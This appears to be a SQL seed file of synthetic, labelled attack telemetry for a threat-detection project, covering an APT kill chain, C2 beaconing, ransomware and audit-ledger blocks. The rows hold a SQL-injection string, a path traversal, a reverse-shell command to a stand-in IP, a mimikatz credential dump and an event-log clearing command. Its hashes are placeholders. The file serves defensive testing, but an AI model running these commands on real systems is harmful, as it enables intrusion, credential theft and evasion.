-- ============================================================================
-- BASTION: ZERO-TRUST IDENTITY GRAPH AND THREAT DETECTION KERNEL
-- File: sql/seeds/06_attack_scenarios.sql
-- Description: Labeled multi-stage APT attack campaigns, Cobalt Strike beaconing,
--              ransomware bursts, and cryptographic audit ledger test blocks.
-- Dialect: ANSI SQL / DuckDB / PostgreSQL
-- Copyright 2026 Aneesh Krishna Parthasarathy. Apache License 2.0.
-- ============================================================================

-- ----------------------------------------------------------------------------
-- 1. Campaign APT29 (Cozy Bear) - Multi-Stage Full Kill-Chain Breach
-- ----------------------------------------------------------------------------

-- Step 1: Initial Ingress - Web Application Exploitation (T1190)
INSERT INTO telemetry_http_access_logs (
    request_id, asset_id, request_time, client_ip, http_method, uri_path,
    query_string, status_code, bytes_sent, duration_ms, user_agent
) VALUES
('http-atk-01', 'ast-web-01', '2026-10-15 14:00:00', '198.51.100.99', 'GET', '/api/v1/search', 'q=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users--', 200, 18500, 120, 'sqlmap/1.7#stable'),
('http-atk-02', 'ast-web-01', '2026-10-15 14:02:15', '198.51.100.99', 'GET', '/../../../../etc/passwd', NULL, 200, 3200, 45, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
ON CONFLICT (request_id) DO NOTHING;

-- Step 2: Execution - Unix Reverse Interactive Shell Pipeline (T1059.004)
INSERT INTO telemetry_process_events (
    process_guid, asset_id, parent_process_guid, pid, ppid, event_time,
    process_name, process_path, command_line, executing_user, hash_sha256, is_elevated, integrity_level
) VALUES
('proc-atk-01', 'ast-web-01', 'proc-b-02', 8841, 512, '2026-10-15 14:05:00',
 'sh', '/bin/sh', 'sh -i >& /dev/tcp/198.51.100.42/443 0>&1', 'www-data',
 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', FALSE, 'MEDIUM')
ON CONFLICT (process_guid) DO NOTHING;

UPDATE core_compute_assets SET is_compromised = TRUE WHERE asset_id = 'ast-web-01';
UPDATE graph_nodes SET is_compromised = TRUE WHERE node_id = 'node-web-01';


-- Step 3: Discovery - Internal Network Port Sweep (T1046)
INSERT INTO telemetry_vpc_flow_logs (
    flow_id, account_id, interface_id, src_addr, dst_addr, src_port, dst_port,
    protocol, packets, bytes_transferred, start_time, end_time, action
) VALUES
('fl-atk-scan-01', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.2.1',  49152, 22, 6, 2, 120, '2026-10-15 14:10:00', '2026-10-15 14:10:01', 'REJECT'),
('fl-atk-scan-02', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.2.2',  49153, 22, 6, 2, 120, '2026-10-15 14:10:02', '2026-10-15 14:10:03', 'REJECT'),
('fl-atk-scan-03', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.2.20', 49154, 22, 6, 2, 120, '2026-10-15 14:10:04', '2026-10-15 14:10:05', 'ACCEPT'),
('fl-atk-scan-04', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.3.50', 49155, 22, 6, 2, 120, '2026-10-15 14:10:06', '2026-10-15 14:10:07', 'ACCEPT'),
('fl-atk-scan-05', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.3.15', 49156, 22, 6, 2, 120, '2026-10-15 14:10:08', '2026-10-15 14:10:09', 'ACCEPT')
ON CONFLICT (flow_id) DO NOTHING;

-- Step 4: Lateral Movement - Direct SSH Pivot from DMZ to Crown Jewel Database (T1021.004)
INSERT INTO telemetry_vpc_flow_logs (
    flow_id, account_id, interface_id, src_addr, dst_addr, src_port, dst_port,
    protocol, packets, bytes_transferred, start_time, end_time, action
) VALUES
('fl-atk-pivot-01', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '10.0.3.50', 58210, 22, 6, 450, 280000, '2026-10-15 14:15:00', '2026-10-15 14:25:00', 'ACCEPT')
ON CONFLICT (flow_id) DO NOTHING;

-- Step 5: Privilege Escalation - Administrative Policy Attached (T1078.004)
INSERT INTO telemetry_cloudtrail_events (
    event_id, account_id, event_time, event_source, event_name, principal_id,
    principal_arn, source_ip_address, user_agent, request_parameters, response_elements, status_code
) VALUES
('ct-atk-01', 'acc-prod-01', '2026-10-15 14:28:00', 'iam.amazonaws.com', 'AttachUserPolicy', 'usr-dormant-01',
 'arn:aws:iam::acc-prod-01:user/eve.contractor', '198.51.100.99', 'aws-cli/2.15.15 Python/3.11.6',
 '{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"eve.contractor"}', '{}', 200)
ON CONFLICT (event_id) DO NOTHING;

-- Step 6: Collection - Bulk S3 Object Extraction (T1530)
INSERT INTO telemetry_cloudtrail_events (
    event_id, account_id, event_time, event_source, event_name, principal_id,
    principal_arn, source_ip_address, user_agent, request_parameters, response_elements, status_code
) VALUES
('ct-atk-02', 'acc-prod-01', '2026-10-15 14:32:00', 's3.amazonaws.com', 'GetObject', 'usr-dormant-01',
 'arn:aws:iam::acc-prod-01:user/eve.contractor', '198.51.100.99', 'aws-cli/2.15.15 Python/3.11.6',
 '{"bucketName":"bastion-prod-restricted-pii-vault","key":"customers_2026.csv.gz"}', '{}', 200),
('ct-atk-03', 'acc-prod-01', '2026-10-15 14:32:05', 's3.amazonaws.com', 'GetObject', 'usr-dormant-01',
 'arn:aws:iam::acc-prod-01:user/eve.contractor', '198.51.100.99', 'aws-cli/2.15.15 Python/3.11.6',
 '{"bucketName":"bastion-prod-restricted-pii-vault","key":"tax_records_2026.tar"}', '{}', 200)
ON CONFLICT (event_id) DO NOTHING;

-- Step 7: Exfiltration - DNS Data Tunneling Channel (T1048.003)
INSERT INTO telemetry_dns_queries (
    query_id, asset_id, query_time, client_ip, query_name, query_type, response_code, resolved_ip, ttl_seconds, entropy_score
) VALUES
('dns-atk-01', 'ast-web-01', '2026-10-15 14:40:00', '10.0.1.55', '7861736865645f746f6b656e5f30312e6170692d636c6f75642d73796e632d63322e6e6574', 'TXT', 'NOERROR', '198.51.100.42', 60, 4.12),
('dns-atk-02', 'ast-web-01', '2026-10-15 14:40:02', '10.0.1.55', '637573746f6d65725f7265636f7264735f30322e6170692d636c6f75642d73796e632d63322e6e6574', 'TXT', 'NOERROR', '198.51.100.42', 60, 4.25),
('dns-atk-03', 'ast-web-01', '2026-10-15 14:40:04', '10.0.1.55', '70617373776f72645f64756d705f30332e6170692d636c6f75642d73796e632d63322e6e6574', 'TXT', 'NOERROR', '198.51.100.42', 60, 4.18)
ON CONFLICT (query_id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 2. Campaign: Periodic C2 Beaconing with Jitter
-- ----------------------------------------------------------------------------

INSERT INTO telemetry_vpc_flow_logs (
    flow_id, account_id, interface_id, src_addr, dst_addr, src_port, dst_port,
    protocol, packets, bytes_transferred, start_time, end_time, action
) VALUES
('fl-bcn-01', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51001, 443, 6, 8, 850, '2026-10-15 15:00:00', '2026-10-15 15:00:02', 'ACCEPT'),
('fl-bcn-02', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51002, 443, 6, 8, 860, '2026-10-15 15:01:01', '2026-10-15 15:01:03', 'ACCEPT'),
('fl-bcn-03', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51003, 443, 6, 8, 845, '2026-10-15 15:01:59', '2026-10-15 15:02:01', 'ACCEPT'),
('fl-bcn-04', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51004, 443, 6, 8, 855, '2026-10-15 15:03:02', '2026-10-15 15:03:04', 'ACCEPT'),
('fl-bcn-05', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51005, 443, 6, 8, 850, '2026-10-15 15:04:00', '2026-10-15 15:04:02', 'ACCEPT'),
('fl-bcn-06', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51006, 443, 6, 8, 862, '2026-10-15 15:05:03', '2026-10-15 15:05:05', 'ACCEPT'),
('fl-bcn-07', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51007, 443, 6, 8, 848, '2026-10-15 15:05:58', '2026-10-15 15:06:00', 'ACCEPT'),
('fl-bcn-08', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51008, 443, 6, 8, 852, '2026-10-15 15:07:01', '2026-10-15 15:07:03', 'ACCEPT'),
('fl-bcn-09', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51009, 443, 6, 8, 855, '2026-10-15 15:08:00', '2026-10-15 15:08:02', 'ACCEPT'),
('fl-bcn-10', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51010, 443, 6, 8, 850, '2026-10-15 15:09:02', '2026-10-15 15:09:04', 'ACCEPT'),
('fl-bcn-11', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51011, 443, 6, 8, 858, '2026-10-15 15:10:01', '2026-10-15 15:10:03', 'ACCEPT'),
('fl-bcn-12', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51012, 443, 6, 8, 849, '2026-10-15 15:10:59', '2026-10-15 15:11:01', 'ACCEPT'),
('fl-bcn-13', 'acc-prod-01', 'eni-web-01', '10.0.1.55', '198.51.100.42', 51013, 443, 6, 8, 853, '2026-10-15 15:12:01', '2026-10-15 15:12:03', 'ACCEPT')
ON CONFLICT (flow_id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 3. Campaign: Ransomware Outbreak and Defense Evasion (Wizard Spider)
-- ----------------------------------------------------------------------------

INSERT INTO telemetry_process_events (
    process_guid, asset_id, parent_process_guid, pid, ppid, event_time,
    process_name, process_path, command_line, executing_user, hash_sha256, is_elevated, integrity_level
) VALUES
('proc-rw-01', 'ast-web-01', 'proc-atk-01', 9912, 8841, '2026-10-15 16:00:00',
 'mimikatz.exe', '/tmp/mimikatz.exe', 'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit', 'root',
 '5d41402abc4b2a76b9719d911017c592b0a1d47372cf017d91e6dc8ec7b0934d', TRUE, 'SYSTEM'),
('proc-rw-02', 'ast-web-01', 'proc-atk-01', 9915, 8841, '2026-10-15 16:05:00',
 'wevtutil.exe', '/windows/system32/wevtutil.exe', 'wevtutil cl System', 'root',
 'b1c2d3e4f5a60123456789abcdef0123456789abcdef0123456789abcdef0123', TRUE, 'SYSTEM')
ON CONFLICT (process_guid) DO NOTHING;

-- Rapid Ransomware File Encryption Mod Log
INSERT INTO telemetry_file_modifications (
    modification_id, asset_id, process_guid, event_time, file_path, action, file_size_bytes
) VALUES
('fim-rw-01', 'ast-web-01', 'proc-rw-01', '2026-10-15 16:10:01', '/var/data/finance_q1.xlsx.locked', 'MODIFIED', 450000),
('fim-rw-02', 'ast-web-01', 'proc-rw-01', '2026-10-15 16:10:02', '/var/data/customers.db.locked',   'MODIFIED', 12000000),
('fim-rw-03', 'ast-web-01', 'proc-rw-01', '2026-10-15 16:10:03', '/var/data/contracts.pdf.locked',  'MODIFIED', 850000)
ON CONFLICT (modification_id) DO NOTHING;

-- ----------------------------------------------------------------------------
-- 4. Cryptographic SHA-256 Audit Ledger Chain
-- ----------------------------------------------------------------------------

INSERT INTO audit_crypto_ledger (
    block_height, event_timestamp, actor_arn, action_type, target_entity_arn,
    payload_before, payload_after, nonce, previous_block_hash, current_block_hash
) VALUES
(
    0,
    '2026-10-15 00:00:00',
    'arn:aws:iam::acc-sec-01:user/security-ca',
    'GENESIS_INITIALIZE',
    'arn:aws:iam::acc-sec-01:root',
    NULL,
    '{"genesis":"BASTION_SEC_KERNEL_GENESIS","epoch":1792022400}',
    '00000000',
    '0000000000000000000000000000000000000000000000000000000000000000',
    'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
),
(
    1,
    '2026-10-15 08:30:00',
    'arn:aws:iam::acc-prod-01:user/alice.admin',
    'CREATE_IAM_ROLE',
    'arn:aws:iam::acc-prod-01:role/AdminBreakGlassRole',
    NULL,
    '{"role":"AdminBreakGlassRole","max_session":3600}',
    '00000001',
    'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
),
(
    2,
    '2026-10-15 09:00:00',
    'arn:aws:iam::acc-prod-01:user/bob.devops',
    'ATTACH_POLICY',
    'arn:aws:iam::acc-prod-01:policy/DevOpsAutomation',
    NULL,
    '{"attached_to":"grp-devops","policy":"DevOpsAutomation"}',
    '00000002',
    '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8'
)
ON CONFLICT (block_height) DO NOTHING;
